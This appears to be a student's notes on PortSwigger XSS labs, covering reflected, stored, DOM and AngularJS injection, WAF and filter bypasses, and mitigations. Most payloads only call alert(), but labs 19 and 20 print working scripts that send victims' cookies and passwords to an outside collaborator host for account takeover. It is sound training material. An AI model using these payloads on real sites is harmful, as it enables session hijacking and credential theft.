## Links:
1) https://portswigger.net/web-security/cross-site-scripting
   a. https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting
   b. https://portswigger.net/web-security/cross-site-scripting/stored
   c. https://portswigger.net/web-security/cross-site-scripting/dom-based

2) https://portswigger.net/web-security/cross-site-scripting/exploiting
	 https://portswigger.net/web-security/cross-site-scripting/contexts
1) https://portswigger.net/web-security/cross-site-scripting/content-security-policy
2) https://portswigger.net/web-security/cross-site-scripting/dangling-markup
3) https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
4) https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (cheat sheet)

## **1. Stored XSS into HTML context with nothing encoded**

```
<script>alert(1)</script>
```

## **2. DOM XSS in `document.write` sink using source `location.search`**

String has been placed inside an `img src` attribute.
1. Breaking out of the `img` attribute by:
	`"><svg onload=alert(1)>`  ("> is closing the previous tag )

SVG tags can include scripting capabilities, such as JavaScript, through attributes like `onload`, `onclick`, etc. This means that an attacker can inject an SVG element with an `onload` attribute to execute malicious scripts. Some web applications may not properly sanitize or filter SVG elements. Since SVG is less commonly considered in input sanitization, attackers may exploit it to bypass security filters that would catch more common tags like `<script>`.


## **3. DOM XSS in `innerHTML` sink using source `location.search`**

String has been placed inside an `img src` attribute. 
The value of the `src` attribute is invalid and throws an error. This triggers the `onerror` event handler, which then calls the `alert()` function. 

	<img src=0 onerror=alert(0)>
	
![[Pasted image 20240703015300.png]]


## **4. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**

The vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

Changing the query parameter `returnPath` to `/` followed by a random alphanumeric string we observe that our random string has been placed inside an a `href` attribute.

We will XSS by changing  `returnPath` to: 
```
javascript:alert(document.cookie)
```

![[Pasted image 20240703034210.png]]
![[Pasted image 20240703034106.png]]


## **5. Reflected XSS into attribute with angle brackets HTML-encoded**

String has been reflected inside a quoted attribute `value` and we will use onmouseover='alert(0)'

` " onmouseover='alert(0)' `

![[Pasted image 20240703053618.png]]


## **6. Stored XSS into anchor href attribute with double quotes HTML-encoded**

String has been reflected inside an anchor `href` attribute
![[Pasted image 20240713161951.png]]


## **7. Reflected XSS into a JavaScript string with angle brackets HTML encoded**

String has been reflected inside a JavaScript string
![[Pasted image 20240713173758.png]]
![[Pasted image 20240713173710.png]]


## **8. XSS in a storeID parameter**

JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.

Adding a `storeId` query parameter to the URL and enter a random alphanumeric string as its value we notice that the string is now listed as one of the options in the drop-down list.

` ?productId=1& storeId=paein </option></select><img src="0" onerror="alert(1)"

![[Pasted image 20240713181806.png]]

![[Pasted image 20240713182122.png]]


## **9. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

![[Pasted image 20240913013110.png]]
1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
3. Enter the following AngularJS expression in the search box:
```
{{$eval.constructor('alert(1)')()}}`
```

- **AngularJS Expression Syntax (`{{}}`):** In AngularJS, expressions wrapped in `{{ }}` are used for **data binding**. When an AngularJS application renders, it processes these expressions, evaluates them, and injects the result into the HTML page.
    - `{{ 2 + 2 }}` would be evaluated and replaced with `4`.
    
- **The `$eval` Function:** In AngularJS, the `$eval` function allows evaluating arbitrary AngularJS expressions within the context of the current scope.
    - `$eval('2 + 2')` would evaluate the expression `'2 + 2'` and return `4`.
    
- **The `constructor` Property:** Every function in JavaScript has a `constructor` property, which points to the **Function constructor**. The `Function` constructor allows you to create new JavaScript functions dynamically from strings of code.
    - `Function('alert(1)')` creates a function that, when called, executes `alert(1)`.

### How the Exploit Works:

- **Step 1: Bypass AngularJS Expression Binding**  
    `{{$eval.constructor('alert(1)')()}}` starts with `{{ }}`, which tells AngularJS to evaluate the expression inside.
    
- **Step 2: Using `$eval` to Evaluate Arbitrary Code**  
    The `$eval` function is invoked to evaluate a JavaScript expression. Instead of passing a simple expression like `2 + 2`, it passes something more dangerous: `constructor`.
    
- **Step 3: Accessing the `Function` Constructor**  
    By accessing `$eval.constructor`, the code is retrieving the **Function constructor**. This is a powerful feature that allows you to create and run new functions dynamically.
    - `constructor('alert(1)')` creates a new function with the body `alert(1)`.
    
- **Step 4: Invoking the Function**  
    The `()` at the end executes the newly created function, which runs the JavaScript `alert(1)`.


## **10. Reflected DOM XSS**

1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as `"XSS"`.
3. Return to the Proxy tool in Burp Suite and forward the request.
4. On the Intercept tab, notice that the string is reflected in a JSON response called `search-results`.
5. From the Site Map, open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.
6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.

	![[Pasted image 20240913022624.png]]

	![[Pasted image 20240913022737.png]]

	![[Pasted image 20240913022857.png]]
	![[Pasted image 20240913023745.png]]

### Vulnerability Breakdown:

1. **Initial Problem: Unescaped Backslash (`\`) in JSON**:
    - The attacker injects a backslash (`\`) into a search term or some user input.
    - The server does not properly escape or sanitize the backslash, leading to incorrect escaping in the JSON response.
    - JSON uses backslashes to escape special characters (like double quotes `"`), and when the server fails to handle this properly, it leads to an injection point.
    
1. **Double-Escaping Backslashes**:
    - When the server tries to escape double quotes (`"`) inside a JSON string, it adds a backslash before them.
    - However, since a backslash was already injected by the attacker, the server effectively generates two backslashes (`\\`), which cancels out the escaping.
    - This means that the double-quote character (`"`) is no longer escaped properly, allowing the attacker to **break out of the JSON string**.
    
1. **Closing the JSON String Prematurely**:
    - In the context of a JSON response, you typically expect something like this:
        
        `{"searchTerm":"injected_input", "results":[]}`
        
    - But the injected backslash combined with a double quote (`\"`) causes the JSON string for `searchTerm` to be prematurely terminated. The result looks like this:
        
        `{"searchTerm":"\\"`
        
    - This breaks the string early, so everything that follows is now treated as raw code, not a part of the JSON string.
    
1. **Injecting Code After Escaping**:
    - The attacker then injects `-alert(1)` after the broken string.
    - The hyphen (`-`) here is used as an arithmetic operator to separate expressions. This breaks the JSON format but results in executable JavaScript.
    - The `alert(1)` part is now treated as executable JavaScript, and it will be executed in the browser, causing the alert box to pop up.

1. **Closing the JSON Object and Commenting Out the Rest**:
    
    - After injecting the JavaScript payload, the attacker closes the JSON object early with a closing curly bracket (`}`).
    - To ensure the rest of the JSON response doesn’t interfere with the injected payload, the attacker adds two forward slashes (`//`), which in JavaScript indicate a comment. This comments out the rest of the JSON response.
    - The final payload looks like this:
        
        `{"searchTerm":"\\"-alert(1)}//", "results":[]}`
        
    - In this response, the rest of the valid JSON (`"results":[]`) is ignored because it's commented out.

### Final Result:

- The attacker injects the backslash and code (`\"-alert(1)}//`), resulting in a malformed JSON response that breaks out of the intended structure.
- The malformed JSON is processed in the browser as JavaScript, where:
    - The `"-alert(1)` breaks the JSON string and creates a JavaScript expression with the `alert(1)` code.
    - The closing curly bracket (`}`) terminates the object.
    - The `//` comments out the rest of the response to avoid any errors.

### Example of What Happens in the Browser:

When the injected JSON response: `{"searchTerm":"\\"-alert(1)}//", "results":[]}`
is parsed, the browser sees this JavaScript: `{"searchTerm": "\\" - alert(1)} //", "results":[]`

### Prevention:
1. **Escape Special Characters Properly**: Ensure that all user input is properly sanitized and escaped before being included in JSON responses. Escape backslashes, quotes, and other special characters correctly.
2. **Content-Type Headers**: Ensure that the JSON response has the correct `Content-Type` header (`application/json`), so that browsers treat it as data and not executable code.
3. **Strict JSON Parsing**: Use strict JSON parsers that do not allow JavaScript execution within a JSON context.
4. **Output Encoding**: If user input is included in a context that can affect code execution, ensure proper encoding to prevent XSS and other injection attacks.


## **11. Stored DOM XSS**

`<><img src=1 onerror=alert(1)>`

In an attempt to prevent [XSS](https://portswigger.net/web-security/cross-site-scripting), the website uses the JavaScript `replace()` function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.

	![[Pasted image 20240913034111.png]]

### How the Attack Works:

1. **The Vulnerable `replace()` Function**:
    - The website uses JavaScript's `replace()` function to sanitize the input by encoding angle brackets (`<`, `>`), which are typically used to inject HTML or JavaScript tags (e.g., `<script>`, `<img>`, etc.).
    - When the `replace()` function is used with a **string as the first argument**, it only replaces the **first occurrence** of that string in the input. For example:
    
        `let comment = "<script>alert(1)</script>"; comment = comment.replace("<", "&lt;"); // Only replaces the first "<"`
        
        This would result in:
        
        `"&lt;script>alert(1)</script>"`
        
        Notice that the first `<` is replaced, but subsequent occurrences are left unchanged, allowing potential injection points.

1. **Bypassing the Filter**:
    - The attacker takes advantage of this limitation by including **multiple angle brackets** in their input. Since only the **first occurrence** is replaced, the rest remain untouched, which opens a door for injecting malicious code.
        
    - For example, the attacker submits the following payload as a comment:
        
        `<><img src=1 onerror=alert(1)>`
        
    - The website's sanitization mechanism replaces the **first angle bracket** `<` with `&lt;`, leaving the rest of the input intact. This would result in the following processed input:
        
        `&lt;><img src=1 onerror=alert(1)>`
        
3. **Exploiting the Remaining Unescaped Tags**:
    
    - After the replacement, the comment is rendered as:
        
        `&lt;><img src=1 onerror=alert(1)>`
        
    - The `&lt;` at the beginning is just an escaped less-than sign (`<`), so it is harmless. However, the following `><img src=1 onerror=alert(1)>` remains valid HTML.
    - The browser interprets this as:
        
        `><img src=1 onerror=alert(1)>`
        
    - The `<img>` tag with a fake `src` value (`src=1`) triggers the `onerror` event, which runs the malicious JavaScript code `alert(1)`.

1. **Successful XSS Attack**:
    
    - Since the browser executes the `onerror` JavaScript code, the attacker successfully triggers an XSS attack, despite the website's attempt to filter angle brackets.
    - This results in a popup alert with the message "1," demonstrating the vulnerability.

### Mitigation:

1. **Use Global Regular Expressions**:
    - The website should use global regular expressions (`/</g`, `/>/g`) to ensure that **all** occurrences of angle brackets are replaced, not just the first one.

1. **Use a Proper HTML Sanitizer**:
    - Instead of manually replacing characters, it’s better to use a robust HTML sanitization library that is specifically designed to strip or escape dangerous HTML and JavaScript. Examples include DOMPurify or Google’s Caja.

2. **Encode Output Properly**:
    - Ensure that all user inputs are properly encoded before being rendered to the browser. Encoding should handle special characters like `<`, `>`, and `"` to prevent XSS vulnerabilities.

## **12. Reflected XSS into HTML context with most tags and attributes blocked**

This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

1. Inject a standard XSS vector, such as:
    `<img src=1 onerror=print()>`
    
1. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
2. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
3. In Burp Intruder, in the Positions tab, replace the value of the search term with: `<>`
4. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`
5. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".
6. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
7. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `body` payload, which caused a 200 response.
8. Go back to the Positions tab in Burp Intruder and replace your search term with:
    `<body%20=1>`

1. Place the cursor before the `=` character and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
2. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "copy events to clipboard".
3. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
4. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onresize` payload, which caused a 200 response.
5. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`


- first we have to try out for different tags that are not blocked by WAF
	![[Pasted image 20240913043552.png]]
		![[Pasted image 20240913043613.png]]
			![[Pasted image 20240913043631.png]]
				![[Pasted image 20240913043651.png]]

- now for onload method (we need to find a substitute method that is not blocked by WAF)
	![[Pasted image 20240913043719.png]]
		![[Pasted image 20240913044102.png]]
			![[Pasted image 20240913044126.png]]
				![[Pasted image 20240913044154.png]]
					![[Pasted image 20240913044215.png]]

	- using iframe method with onload resize to automatically generate the XXS without user interaction
	![[Pasted image 20240913044440.png]]

## **13.Reflected XSS into HTML context with all tags blocked except custom ones**

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.

 Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
    `<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>`

	![[Pasted image 20240913050102.png]]
	![[Pasted image 20240913050151.png]]
		![[Pasted image 20240913050241.png]]
			![[Pasted image 20240913050203.png]]

- now we will create a script where we will place our malicious URL generated in order to generate an automatically XXS when user will acces it:
	- ![[Pasted image 20240913050351.png]]

## **14. Reflected XSS with some SVG markup allowed**
This lab has a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability. The site is blocking common tags but misses some SVG tags and events.

1. Inject a standard XSS payload, such as:
    `<img src=1 onerror=alert(1)>`

1. Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.
2. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
3. In Burp Intruder, in the Positions tab, click "Clear §".
4. In the request template, replace the value of the search term with: `<>`
5. Place the cursor between the angle brackets and click "Add §" twice to create a payload position. The value of the search term should now be: `<§§>`
6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".
7. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
8. When the attack is finished, review the results. Observe that all payloads caused an HTTP 400 response, except for the ones using the `<svg>`, `<animatetransform>`, `<title>`, and `<image>` tags, which received a 200 response.
10. Go back to the Positions tab in Burp Intruder and replace your search term with:
    `<svg><animatetransform%20=1>`

1. Place the cursor before the `=` character and click "Add §" twice to create a payload position. The value of the search term should now be:
    `<svg><animatetransform%20§§=1>`

1. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy events to clipboard".
2. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
3. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onbegin` payload, which caused a 200 response.

    Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved:
    `https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimat`

	![[Pasted image 20240913182924.png]]
		![[Pasted image 20240913184634.png]]

The `<svg>` tag can be used in **XSS (Cross-Site Scripting)** attacks because it's a container for graphics that can include various elements, including scripts and events. Since many websites allow the inclusion of SVG code, attackers can leverage it to inject malicious scripts.
### Example of an SVG-Based XSS Attack:
`<svg onload="alert(1)"></svg>`

- In this example, the `onload` event of the `<svg>` tag is used to trigger a JavaScript `alert(1)` when the SVG is loaded into the browser. This is a basic example, but it demonstrates how SVG tags can be used to run JavaScript in the browser.
### Why SVG is Vulnerable:
1. **SVG Supports Scripting and Events**: SVG allows you to include event handlers like `onload`, `onclick`, etc., which can execute JavaScript code.
2. **SVG is Often Trusted**: Websites often allow SVG content to be uploaded or embedded, sometimes without properly sanitizing the SVG content.

### Other Ways to Use SVG for XSS Injection:

#### 1. **Using `<script>` Inside `<svg>`:**

`<svg>   <script>alert(1)</script> </svg>`

#### 2. **Using `<animate>` with Event Listeners:**

`<svg>   <animate onbegin="alert(1)"></animate> </svg>`

The `onbegin` event in the `<animate>` element can trigger JavaScript when the animation begins.

#### 3. **Using `<a>` for Click Events:**

`<svg>   <a href="javascript:alert(1)"> <text x="20" y="20">Click Me</text>   </a> </svg>`

This example uses a clickable `<text>` element, where the `href` is a `javascript:` URL that triggers an `alert`.

## **15. Reflected XSS into a JavaScript string with single quote and backslash escaped**

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Replace your input with the following payload to break out of the script block and inject a new script:
    `</script><script>alert(1)</script>`

- single quote is escaped as backslash
	![[Pasted image 20240913195042.png]]
	
	- if we try to escape the backslash using our own backlash we see that is escaped as well		![[Pasted image 20240913195113.png]]
- To bypass this escaping mechanism, we need to completely break out of the JavaScript string and inject our own script.	![[Pasted image 20240913195137.png]]
### **Mitigation**:

1. **Sanitize User Input**: Ensure that all user inputs are properly escaped and sanitized before being reflected in the HTML or JavaScript context.
2. **Use CSP (Content Security Policy)**: Implement a strict CSP to block the execution of inline JavaScript.
3. **Encode Output**: Properly encode special characters when reflecting user inputs, especially inside sensitive contexts like JavaScript or HTML.

## **16. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Try sending the payload `test\payload` and observe that your backslash doesn't get escaped.
5. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
    `\'-alert(1)//`

1. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

as in previous examples , quote is encoded by server by a backslash --> we are tryin to escape that  backslash using ours backslash(in this case it is no more escaped)  --> concatenate the payload in the string using (-)substraction --> commenting everything else after the payload :)


## **17. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**
1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an `onclick` event handler attribute.
4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls `alert`, using the following payload:
    `http://foo?&apos;-alert(1)-&apos;`

![[Pasted image 20240914030938.png]]
	![[Pasted image 20240914030949.png]]

This scenario describes a **Stored Cross-Site Scripting (XSS)** attack where user input is being stored on the server and then reflected into an `onclick` event handler in HTML. The input is being partially sanitized, but not fully, leaving room for an attacker to exploit this vulnerability.

### Breakdown of the Context
1. **Stored XSS**: This means the malicious input is saved on the server and is later served to other users. When users interact with the affected element (like clicking a button), the malicious script executes in their browser.
2. **Context**: The input is injected into an `onclick` event handler. This handler is used in HTML elements to define JavaScript code that runs when the element is clicked.
3. **Partial Sanitization**:
    - **Angle brackets (`<` and `>`)** are HTML-encoded to prevent injection of raw HTML tags.
    - **Double quotes (`"`)** are also HTML-encoded to prevent breaking out of HTML attributes.
    - **Single quotes (`'`)** and **backslashes (`\`)** are escaped to prevent breaking out of the JavaScript string.

### Initial Input Reflection
Let's assume an example of how the input might be reflected in an `onclick` event handler:

`<button onclick="doSomething('USER_INPUT')">Click me</button>`

After injecting the sanitized input, it could look like this:

`<button onclick="doSomething('&apos;-alert(1)-&apos;')">Click me</button>`

Even though some encoding and escaping are applied, this does not entirely prevent XSS because the JavaScript context in an `onclick` event can still execute code. An attacker can carefully craft a payload to bypass these filters.

### The Payload: `http://foo?&apos;-alert(1)-&apos;`
The attacker provides this payload as the input: `http://foo?&apos;-alert(1)-&apos;`. Let's break it down:

1. **HTML-encoded Single Quotes (`&apos;`)**: These represent the single quote character (`'`) in HTML. When decoded, they will break out of the existing single-quoted string.
2. **Payload Breakdown**:
    - `&apos;` translates to `'`, which ends the current JavaScript string.
    - `-alert(1)-` is a JavaScript expression that will be executed once the context is broken.
    - `&apos;` again ends this injected JavaScript code.

### Injecting the Payload
When the payload is inserted into the `onclick` attribute, it will look something like this before decoding:

`<button onclick="doSomething('&apos; -alert(1)- &apos;')">Click me</button>`

### Resulting Code After Decoding

When the HTML is parsed and the `&apos;` entities are decoded, it becomes:

`<button onclick="doSomething('' -alert(1)- '')">Click me</button>`

Now, it looks like this:

- The `onclick` event now contains: `doSomething('' -alert(1)- '')`
- The JavaScript string is broken because the first `&apos;` decodes to a single quote (`'`), ending the string.
- `-alert(1)-` is then treated as JavaScript code, which will execute and show an alert when the button is clicked.

### Mitigation
1. **Proper Input Validation**: Validate and sanitize inputs on the server side, ensuring no harmful scripts can be executed.
2. **Output Encoding**: Encode user input appropriately based on the context where it's used. For event handler attributes, this means ensuring that input can't break out of the JavaScript context.
3. **Use Safe Methods**: Avoid inserting user input directly into inline event handlers. Instead, use event listeners added through JavaScript code.

## **18. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript template string.
3. Replace your input with the following payload to execute JavaScript inside the template string: `${alert(1)}`
4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

## **19. Exploiting cross-site scripting to steal cookies**
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    
    `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`
    
    This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
    
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.

Without using Burp Collaborator - Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.

## **20. Exploiting cross-site scripting to capture passwords**
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
```
   <input name=username id=username> 
  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.

4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's username and password in the POST body.
6. Use the credentials to log in as the victim user.

If autofill is active and accessible via JavaScript, this poses a security risk. Attackers can exploit this by injecting malicious scripts (e.g., through an XSS vulnerability) to read and send the autofilled credentials to an external server.

#### **Check the Input Field Attributes:**
- Autofill relies on certain attributes in the input fields, such as `name`, `id`, and `autocomplete`.
- The browser might use the `name` or `id` attribute to identify the fields. In this case, "username" and "password" are common names that browsers use to autofill.
- Ensure these fields don’t have an `autocomplete="off"` or `autocomplete="new-password"` attribute, which would typically prevent autofill.
    ```
    <input name="username" id="username"> 
    <input type="password" name="password">
``

- Since there's no `autocomplete` attribute set to "off," browsers may attempt to autofill these fields.

**Mitigation**
- Use the `autocomplete` attribute to guide browsers not to autofill sensitive fields:
    
    ```
    <input name="username" id="username" autocomplete="off"> 
    <input type="password" name="password" autocomplete="new-password">
``

- **Use Unique `name` and `id` Attributes:**
	Avoid using common names like "username" and "password" for input fields that might prompt browsers to autofill.

- **Use `SameSite` Cookies and `HttpOnly` Attributes:**
	Protect session cookies with `SameSite` and `HttpOnly` attributes to minimize the impact of credential exfiltration.

- **Content Security Policy (CSP):**
	Implement a strict CSP to prevent inline JavaScript execution and unauthorized external requests.